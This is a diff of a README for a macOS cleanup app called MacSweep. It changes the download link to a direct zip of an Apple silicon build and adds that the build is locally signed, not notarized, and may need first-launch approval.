@@ -26,7 +26,7 @@ It's written for people who aren't sure what these files are:
 
 ## Install and keep your settings
 
-[Download MacSweep](https://github.com/gwilltsherman-byte/MacSweep/releases), unzip it, and move the app into Applications. Your scanning preferences and hidden items stay saved when you quit. Settings includes backup and restore for moving to another Mac. The download page identifies the supported processor and signing status of each build.
+[Download MacSweep](https://github.com/gwilltsherman-byte/MacSweep/raw/refs/heads/main/downloads/MacSweep-AppleSilicon.zip), unzip it, and move the app into Applications. Your scanning preferences and hidden items stay saved when you quit. Settings includes backup and restore for moving to another Mac. This build is for Apple silicon Macs and is locally signed, but not notarized by Apple. macOS may require first-launch approval in Privacy & Security.
 
 ## What it looks for
 
